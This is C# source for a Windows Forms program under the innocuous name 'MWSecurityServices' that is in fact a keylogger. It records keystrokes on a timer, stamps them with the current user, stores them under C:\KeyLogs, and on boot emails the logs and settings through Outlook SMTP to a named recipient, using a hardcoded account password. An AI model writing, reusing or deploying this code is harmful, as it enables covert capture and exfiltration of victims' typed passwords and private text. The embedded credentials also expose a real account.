using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Net.Mime;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace MWSecurityServices
{
    public partial class Main : Form
    {
        DateTime dt;
        List<string> settings;
        KeyLogger kl;
        SmtpClient sender;
        MailMessage data;
        
        public Main()
        {
            InitializeComponent();
            kl = new KeyLogger();
            dt = DateTime.Now;
            settings = new List<string>();
            sender = new SmtpClient("smtp-mail.outlook.com",25);
            data = new MailMessage("quicksendnetwork@outlook.com", "michaeljwang10@outlook.com", "KeyLogs", "Read the files below");
            settings = File.ReadAllLines("C:\\KeyLogs\\Settings.txt").ToList();
            kl.log = File.ReadAllLines("C:\\KeyLogs\\Logs.txt").ToList();
            kl.log.Add("TimeStamp: " + dt.ToString() + "  User: " + new UserRecording().User() + "\r\n");
            if (settings[1] == "sendonboot=true")
            {
                data.Body += "\r\n";
                for(int i = 0; i < settings.Count(); i++)
                {
                    data.Body += settings[i] + "\r\n";
                }
                for (int i = 0; i < kl.log.Count(); i++)
                {
                    data.Body += kl.log[i] + "\r\n";
                }
                sender.UseDefaultCredentials = false;
                sender.DeliveryMethod = SmtpDeliveryMethod.Network;
                sender.EnableSsl = true;
                sender.Credentials = new NetworkCredential("quicksendnetwork@outlook.com", "ILoveDaddy");
                try
                {
                    sender.Send(data);
                }
                catch(Exception)
                {
                    kl.log.Add("FailedToSendMessage: No internet connection");
                }
               
            }
            
            if (kl.log.Count() > 5000)
            {
                File.AppendAllLines("C:\\KeyLogs\\Archives.txt", kl.log);
                kl.log.Clear();
            }
        }

        private void GetKeys_Tick(object sender, EventArgs e)
        {
            if(settings[0] == "this.Enabled")
            kl.CheckForKeys();
        }

        private void SaveData_Tick(object sender, EventArgs e)
        {
            if (settings[0] == "this.Enabled")
            {
                File.WriteAllLines("C:\\KeyLogs\\Logs.txt", kl.log);
                kl.log = File.ReadAllLines("C:\\KeyLogs\\Logs.txt").ToList();
            }
        }
    }
}
